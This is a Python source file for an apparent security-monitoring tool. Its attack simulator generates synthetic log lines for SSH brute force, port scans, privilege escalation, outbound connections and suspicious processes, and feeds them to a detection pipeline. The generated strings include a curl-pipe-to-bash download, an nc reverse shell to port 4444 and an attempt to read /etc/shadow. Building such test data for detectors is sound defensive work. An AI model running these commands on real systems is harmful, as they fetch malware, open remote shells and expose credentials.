import random
import time
from typing import Callable, List
from sentrywatch.ingest.normalizer import EventNormalizer, LogEvent

ATTACK_IPS = [
    "185.220.101.5",
    "198.51.100.42",
    "203.0.113.88",
    "45.33.32.156",
    "192.0.2.14",
]


class AttackSimulator:
    """Generates realistic synthetic log streams across all 5 incident types."""

    def __init__(self, target_ips: List[str] = None):
        self.target_ips = target_ips or ATTACK_IPS

    def generate_brute_force(self, ip: str = None) -> List[str]:
        ip = ip or random.choice(self.target_ips)
        lines = []
        users = ["admin", "root", "oracle", "user", "support", "test"]
        for _ in range(random.randint(6, 12)):
            user = random.choice(users)
            port = random.randint(30000, 60000)
            lines.append(f"Failed password for invalid user {user} from {ip} port {port} ssh2")
        return lines

    def generate_port_scan(self, ip: str = None) -> List[str]:
        ip = ip or random.choice(self.target_ips)
        lines = []
        target_host = "192.168.1.10"
        ports = random.sample(range(20, 1024), 15)
        for dpt in ports:
            spt = random.randint(30000, 60000)
            lines.append(
                f"[UFW BLOCK] IN=eth0 OUT= SRC={ip} DST={target_host} PROTO=TCP SPT={spt} DPT={dpt} SYN"
            )
        return lines

    def generate_priv_esc(self, ip: str = None) -> List[str]:
        ip = ip or random.choice(self.target_ips)
        lines = [
            f"sudo: pam_unix(sudo:auth): authentication failure; logname=www-data user=root ruser= rhost={ip} tty=/dev/pts/0 dev= COMMAND=/usr/bin/su",
            f"sudo: pam_unix(sudo:auth): authentication failure; logname=guest user=root ruser= rhost={ip} tty=/dev/pts/1 dev= COMMAND=/usr/bin/cat /etc/shadow",
            f"sudo: pam_unix(sudo:auth): authentication failure; logname=guest user=root ruser= rhost={ip} tty=/dev/pts/1 dev= COMMAND=/bin/bash",
        ]
        return lines

    def generate_anomalous_outbound(self, ip: str = None) -> List[str]:
        ip = ip or random.choice(self.target_ips)
        host_ip = "192.168.1.50"
        lines = [
            f"OUTBOUND_CONN src={host_ip} dst={ip} dport=4444 proto=TCP state=ESTABLISHED",
            f"OUTBOUND_CONN src={host_ip} dst={ip} dport=8443 proto=TCP state=ESTABLISHED",
        ]
        return lines

    def generate_suspicious_process(self, ip: str = None) -> List[str]:
        ip = ip or random.choice(self.target_ips)
        lines = [
            f"EXECVE process=sh parent=nginx src_ip={ip} cmdline=/bin/sh -c 'curl http://{ip}/malware.sh | bash'",
            f"EXECVE process=nc parent=apache2 src_ip={ip} cmdline=nc -e /bin/bash {ip} 4444",
        ]
        return lines

    def run_simulation(
        self, callback: Callable[[LogEvent], None], interval_seconds: float = 1.0, count: int = 5
    ) -> None:
        generators = [
            self.generate_brute_force,
            self.generate_port_scan,
            self.generate_priv_esc,
            self.generate_anomalous_outbound,
            self.generate_suspicious_process,
        ]

        for i in range(count):
            gen = random.choice(generators)
            lines = gen()
            for line in lines:
                event = EventNormalizer.normalize(line, source="simulator")
                callback(event)
                time.sleep(0.05)
            time.sleep(interval_seconds)
